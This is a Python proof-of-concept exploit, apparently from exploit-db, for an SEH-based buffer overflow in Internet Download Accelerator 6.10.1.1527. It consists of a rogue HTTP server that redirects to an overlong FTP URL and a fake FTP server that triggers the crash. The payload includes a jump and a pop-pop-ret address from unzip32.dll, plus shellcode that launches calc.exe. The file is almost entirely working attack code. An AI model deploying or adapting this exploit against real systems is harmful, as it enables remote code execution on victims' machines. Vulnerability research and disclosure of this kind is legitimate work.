#!/usr/bin/python
#
# Exploit Title: IDA 6.10.1.1527 FTP SEH Universal exploit.
# Exploit Author: Fady Mohamed Osman (@fady_osman)
# Exploit-db : http://www.exploit-db.com/author/?a=2986
# Youtube : https://www.youtube.com/user/cutehack3r
# Date: Jan 2, 2017
# Vendor Homepage: http://westbyte.com/
# Software Link: http://westbyte.com/index.phtml?page=support&tmp=1&lng=English&product=Internet%20Download%20Accelerator.
# Version: 6.10.1.1527
# Tested on: IDA 6.10.1.1527 Free Version - Windows 7 SP1 - Windows 10.
# --------------
# Internet download accelerator suffers from a BOF when an FTP Download of file with
# long name fails.
# --------------
# To Exploit this issue:
# 1- Run HTTP server that will redirect to the FTP file with long name.
# 2- The ftp server will answer to the commands sent then will open a data connection.
# 3- The script will send an empty file list and close the connection to trigger the BOF condition.
# 5- Happy new year :D.

import SocketServer
import threading


# IP to listen to, needed to construct PASV response so 0.0.0.0 is not gonna work.
ip = "192.168.1.100"
ipParts = ip.split(".")
PasvResp = "("+ ipParts[0]+ "," + ipParts[1]+ "," + ipParts[2] + "," + ipParts[3] + ",151,130)"
# Run Calc.exe
buf=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")





class HTTPHandler(SocketServer.BaseRequestHandler):
    """
    The request handler class for our HTTP server.

    This is just so we don't have to provide a suspicious FTP link with long name.
    """

    def handle(self):
        # self.request is the TCP socket connected to the client
        self.data = self.request.recv(1024).strip()
        print "[*] Recieved HTTP Request"
        print "[*] Sending Redirction To FTP"
        # just send back the same data, but upper-cased
	# SEH Offset 336 - 1056 bytes for the payload - 0x10011b53 unzip32.dll ppr 0x0c
	payload = "ftp://192.168.1.100/"+ 'A' * 336 + "\xeb\x06\x90\x90" + "\x53\x1b\x01\x10" + buf + "B" * (1056 - len(buf))
	self.request.sendall("HTTP/1.1 302 Found\r\n" +
	"Host: Server\r\nConnection: close\r\nLocation: "+ 
	payload+
	"\r\nContent-type: text/html; charset=UTF-8\r\n\r\n")
	print "[*] Redirection Sent..."

class FTPHandler(SocketServer.BaseRequestHandler):
    """
    The request handler class for our FTP server.

    This will work normally and open a data connection with IDA.
    """

    def handle(self):
        # User Command
	self.request.sendall("220 Nasty FTP Server Ready\r\n")
	User = self.request.recv(1024).strip()
        print "[*] Recieved User Command: " + User
	self.request.sendall("331 User name okay, need password\r\n")	
	# PASS Command
        Pass = self.request.recv(1024).strip()
        print "[*] Recieved PASS Command: " + Pass
	self.request.sendall("230-Password accepted.\r\n230 User logged in.\r\n")
        # SYST Command
	Syst = self.request.recv(1024).strip()
        print "[*] Recieved SYST Command: " + Syst
	self.request.sendall("215 UNIX Type: L8\r\n")
	# TYPE Command
	Type = self.request.recv(1024).strip()
	print "[*] Recieved Type Command: " + Type
	self.request.sendall("200 Type set to I\r\n")
	# REST command
	Rest = self.request.recv(1024).strip()
	print "[*] Recieved Rest Command: " + Rest
	self.request.sendall("200 OK\r\n")
	# CWD command
	Cwd = self.request.recv(2048).strip()
	print "[*] Recieved CWD Command: " + Cwd
	self.request.sendall("250 CWD Command successful\r\n")
	
	# PASV command.
	Pasv = self.request.recv(1024).strip()
	print "[*] Recieved PASV Command: " + Pasv
	self.request.sendall("227 Entering Passive Mode " + PasvResp + "\r\n")

	#LIST	
	List = self.request.recv(1024).strip()
	print "[*] Recieved LIST Command: " + List
	self.request.sendall("150 Here comes the directory listing.\r\n226 Directory send ok.\r\n")
	
	


class FTPDataHandler(SocketServer.BaseRequestHandler):
    """
    The request handler class for our FTP Data connection.

    This will send useless response and close the connection to trigger the error.
    """

    def handle(self):
        # self.request is the TCP socket connected to the client
        print "[*] Recieved FTP-Data Request"
        print "[*] Sending Empty List"
        # just send back the same data, but upper-cased
	self.request.sendall("total 0\r\n\r\n")
	self.request.close()


if __name__ == "__main__":
    HOST, PORT = ip, 8000
    SocketServer.TCPServer.allow_reuse_address = True

    print "[*] Starting the HTTP Server."
    # Create the server, binding to localhost on port 8000
    HTTPServer = SocketServer.TCPServer((HOST, PORT), HTTPHandler)

    # Running the http server (using a thread so we can continue and listen for FTP and FTP-Data).
    HTTPThread = threading.Thread(target=HTTPServer.serve_forever)
    HTTPThread.daemon = True
    HTTPThread.start()
    
    print "[*] Starting the FTP Server."
    # Running the FTP server.
    FTPServer = SocketServer.TCPServer((HOST, 21), FTPHandler)

    # Running the FTP server thread.
    FTPThread = threading.Thread(target=FTPServer.serve_forever)
    FTPThread.daemon = True
    FTPThread.start()

    print "[*] Opening the data connection."
    # Opening the FTP data connection - DON'T CHANGE THE PORT.
    FTPData = SocketServer.TCPServer((HOST, 38786), FTPHandler)

    # Running the FTP Data connection Thread.
    DataThread = threading.Thread(target=FTPData.serve_forever)
    DataThread.daemon = True
    DataThread.start()

    print "[*] Listening for FTP Data."
    # Making the main thread wait.
    print "[*] To exit the script please press any key at any time."
    raw_input()